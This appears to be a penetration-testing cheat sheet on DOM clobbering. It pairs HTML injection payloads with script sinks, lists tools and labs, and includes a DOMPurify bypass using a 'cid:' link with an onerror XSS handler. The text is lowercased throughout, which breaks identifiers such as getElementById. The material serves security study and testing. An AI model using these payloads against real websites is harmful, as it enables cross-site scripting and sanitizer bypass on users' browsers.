# dom clobbering

> dom clobbering is a technique where global variables can be overwritten or "clobbered" by naming html elements with certain ids or names. this can cause unexpected behavior in scripts and potentially lead to security vulnerabilities.

## summary

- [tools](#tools)
- [methodology](#methodology)
- [lab](#lab)
- [references](#references)


## tools

- [soheilkhodayari/domclobbering](https://domclob.xyz/domc_markups/list) - comprehensive list of dom clobbering payloads for mobile and desktop web browsers
- [yeswehack/dom-explorer](https://github.com/yeswehack/dom-explorer) - a web-based tool designed for testing various html parsers and sanitizers.
- [yeswehack/dom-explorer live](https://yeswehack.github.io/dom-explorer/dom-explorer#eyjpbnb1dci6iiisinbpcgvsaw5lcyi6w3siawqioij0zgpvzjywnsisim5hbwuioijeb20gvhjlzsisinbpcgvzijpbeyjuyw1lijoirg9tugfyc2vyiiwiawqioijhyju1ann2yyisimhpzguiomzhbhnllcjza2lwijpmywxzzswib3b0cyi6eyj0exblijoidgv4dc9odg1siiwic2vszwn0b3iioijib2r5iiwib3v0chv0ijoiaw5uzxjive1miiwiywrkrg9jdhlwzsi6dhj1zx19xx1dfq==) - reveal how browsers parse html and find mutated xss vulnerabilities


## methodology

exploitation requires any kind of `html injection` in the page.

* clobbering `x.y.value`
    ```html
    // payload
    <form id=x><output id=y>i've been clobbered</output>

    // sink
    <script>alert(x.y.value);</script>
    ```

* clobbering `x.y` using id and name attributes together to form a dom collection
    ```html
    // payload
    <a id=x><a id=x name=y href="clobbered">

    // sink
    <script>alert(x.y)</script>
    ```

* clobbering `x.y.z` - 3 levels deep
    ```html
    // payload
    <form id=x name=y><input id=z></form>
    <form id=x></form>

    // sink
    <script>alert(x.y.z)</script>
    ```

* clobbering `a.b.c.d` - more than 3 levels
    ```html
    // payload
    <iframe name=a srcdoc="
    <iframe srcdoc='<a id=c name=d href=cid:clobbered>test</a><a id=c>' name=b>"></iframe>
    <style>@import '//portswigger.net';</style>

    // sink
    <script>alert(a.b.c.d)</script>
    ```

* clobbering `foreach` (chrome only)
    ```html
    // payload
    <form id=x>
    <input id=y name=z>
    <input id=y>
    </form>

    // sink
    <script>x.y.foreach(element=>alert(element))</script>
    ```

* clobbering `document.getelementbyid()` using `<html>` or `<body>` tag with the same `id` attribute
    ```html
    // payloads
    <html id="cdndomain">clobbered</html>
    <svg><body id=cdndomain>clobbered</body></svg>


    // sink 
    <script>
    alert(document.getelementbyid('cdndomain').innertext);//clobbbered
    </script>
    ```

* clobbering `x.username`
    ```html
    // payload
    <a id=x href="ftp:clobbered-username:clobbered-password@a">

    // sink
    <script>
    alert(x.username)//clobbered-username
    alert(x.password)//clobbered-password
    </script>
    ```

* clobbering (firefox only)
    ```html
    // payload
    <base href=a:abc><a id=x href="firefox<>">

    // sink
    <script>
    alert(x)//firefox<>
    </script>
    ```

* clobbering (chrome only)
    ```html
    // payload
    <base href="a://clobbered<>"><a id=x name=x><a id=x name=xyz href=123>

    // sink
    <script>
    alert(x.xyz)//a://clobbered<>
    </script>
    ```


## tricks

* dompurify allows the protocol `cid:`, which doesn't encode double quote (`"`): `<a id=defaultavatar><a id=defaultavatar name=avatar href="cid:&quot;onerror=alert(1)//">`


## lab

- [portswigger - exploiting dom clobbering to enable xss](https://portswigger.net/web-security/dom-based/dom-clobbering/lab-dom-xss-exploiting-dom-clobbering)
- [portswigger - clobbering dom attributes to bypass html filters](https://portswigger.net/web-security/dom-based/dom-clobbering/lab-dom-clobbering-attributes-to-bypass-html-filters)
- [portswigger - dom clobbering test case protected by csp](https://portswigger-labs.net/dom-invader/testcases/augmented-dom-script-dom-clobbering-csp/)


## references

- [bypassing csp via dom clobbering - gareth heyes - 05 june 2023](https://portswigger.net/research/bypassing-csp-via-dom-clobbering)
- [dom clobbering - hacktricks - january 27, 2023](https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting/dom-clobbering)
- [dom clobbering - portswigger - september 25, 2020](https://portswigger.net/web-security/dom-based/dom-clobbering)
- [dom clobbering strikes back - gareth heyes - 06 february 2020](https://portswigger.net/research/dom-clobbering-strikes-back)
- [hijacking service workers via dom clobbering - gareth heyes - 29 november 2022](https://portswigger.net/research/hijacking-service-workers-via-dom-clobbering)